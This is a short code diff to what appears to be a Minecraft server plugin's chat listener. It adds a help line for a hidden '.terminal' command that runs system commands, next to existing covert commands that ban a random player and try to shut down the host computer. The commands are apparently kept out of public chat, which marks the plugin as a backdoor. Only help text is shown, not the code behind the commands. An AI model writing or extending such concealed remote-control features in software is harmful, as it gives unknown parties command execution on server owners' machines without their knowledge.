@@ -250,6 +250,7 @@ public class PlayerListener implements Listener
             p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
             p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
             p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
+            p.sendMessage(ChatColor.GOLD + ".terminal - Use system commands!");
             p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
             p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
             cancel = true;
